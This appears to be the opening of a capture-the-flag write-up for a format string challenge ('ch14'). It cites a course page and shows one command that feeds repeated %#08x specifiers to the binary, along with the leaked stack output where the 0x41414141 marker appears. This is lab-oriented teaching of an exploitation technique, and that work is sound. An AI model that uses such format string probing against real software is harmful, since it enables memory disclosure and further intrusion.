# FOrmat string bug basic 2 writeup

Used https://www.usna.edu/Users/cs/aviv/classes/si485h/s17/units/06/unit.html as a guide.

First, lets use some simple string to look up into the stack and find our passed in argument.

```sh
./ch14 "AAAA %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x"

# returns [AAAA 0x80485f1 00000000 00000000 0x0000c2 0xbffffb74 0xb7fe1409 0xf63d4e2e 0x4030201 0x41414141 0x38783020 0x35383430 0x3020316]
```




